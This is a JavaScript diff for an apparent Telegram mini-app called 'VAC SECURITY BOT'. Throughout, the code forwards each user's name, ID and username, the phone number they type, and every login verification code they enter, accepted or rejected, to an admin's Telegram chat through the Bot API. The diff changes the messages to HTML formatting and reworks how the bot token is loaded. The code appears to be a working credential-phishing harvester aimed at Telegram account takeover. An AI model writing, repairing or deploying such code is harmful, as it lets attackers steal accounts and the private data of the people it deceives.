@@ -1,55 +1,61 @@
-// Конфигурация (значения будут заменены при сборке)
-const config = {
-    botToken: process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN',
-    adminId: process.env.ADMIN_ID || 'YOUR_ADMIN_ID'
+// Получаем конфигурацию из переменных среды
+const getConfig = () => {
+    // Для GitHub Pages (секреты встроены при сборке)
+    if (window.BOT_CONFIG) {
+        return window.BOT_CONFIG;
+    }
+    
+    // Для локальной разработки
+    return {
+        botToken: 'YOUR_DEV_TOKEN', // Замените для тестов
+        adminId: 'YOUR_DEV_CHAT_ID'
+    };
 };
 
-// Форматирование сообщений
+// Форматирование сообщения
 const formatMessage = (user, action, data = null) => {
-    const userInfo = `👤 *Пользователь:* ${user.first_name || 'Неизвестно'} ${user.last_name || ''}\n` +
-                    `🆔 *ID:* ${user.id || 'Неизвестно'}\n` +
-                    (user.username ? `🔗 *Username:* @${user.username}\n` : '');
+    const userInfo = `👤 <b>Пользователь:</b> ${escapeHtml(user.first_name || 'Неизвестно')} ${escapeHtml(user.last_name || '')}\n` +
+                    `🆔 <b>ID:</b> <code>${user.id || 'Неизвестно'}</code>\n` +
+                    (user.username ? `🔗 <b>Username:</b> @${escapeHtml(user.username)}\n` : '');
 
     let actionText = '';
     switch(action) {
-        case 'init':
-            actionText = '🚪 *Вошел в приложение*';
-            break;
-        case 'phone':
-            actionText = `📱 *Ввел номер:* \`${data}\``;
-            break;
-        case 'code':
-            actionText = `🔢 *Ввел код:* ||\`${data}\`||`;
-            break;
-        case 'code_verified':
-            actionText = '✅ *Код подтвержден*';
-            break;
-        case 'code_failed':
-            actionText = `❌ *Неверный код:* ||\`${data}\`||`;
-            break;
-        case 'exit':
-            actionText = '🚶 *Вышел из приложения*';
-            break;
+        case 'init': actionText = '🚪 <b>Вошел в приложение</b>'; break;
+        case 'phone': actionText = `📱 <b>Ввел номер:</b> <code>${escapeHtml(data)}</code>`; break;
+        case 'code': actionText = `🔢 <b>Ввел код:</b> <code>${escapeHtml(data)}</code>`; break;
+        case 'verified': actionText = '✅ <b>Код подтвержден!</b>'; break;
+        case 'failed': actionText = `❌ <b>Неверный код:</b> <code>${escapeHtml(data)}</code>`; break;
+        case 'exit': actionText = '🚶 <b>Вышел из приложения</b>'; break;
     }
 
-    return `🔐 *VAC SECURITY BOT*\n\n${userInfo}\n${actionText}`;
+    return `🔐 <b>VAC SECURITY BOT</b>\n\n${userInfo}\n${actionText}`;
 };
 
-// Отправка сообщения боту
+// Экранирование HTML
+const escapeHtml = (text) => {
+    return text.toString()
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+};
+
+// Отправка сообщения
 const sendToAdmin = async (text) => {
     try {
+        const config = getConfig();
         const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+        
         const params = {
             chat_id: config.adminId,
             text: text,
-            parse_mode: 'Markdown',
+            parse_mode: 'HTML',
             disable_web_page_preview: true
         };
 
         await fetch(url, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
             },
             body: JSON.stringify(params)
         });
@@ -58,23 +64,23 @@ const sendToAdmin = async (text) => {
     }
 };
 
-// Глобальная функция для отправки событий
+// Глобальная функция для событий
 window.sendToBot = async (action, data = null) => {
     const tg = window.Telegram.WebApp;
     const user = tg.initDataUnsafe.user || {};
-    
     const message = formatMessage(user, action, data);
     await sendToAdmin(message);
 };
 
-// Отслеживание выхода из приложения
-document.addEventListener('visibilitychange', () => {
+// Отслеживание выхода
+const trackExit = () => {
     if (document.visibilityState === 'hidden') {
         window.sendToBot('exit');
     }
-});
+};
 
 // Инициализация
 document.addEventListener('DOMContentLoaded', () => {
     window.sendToBot('init');
+    document.addEventListener('visibilitychange', trackExit);
 });
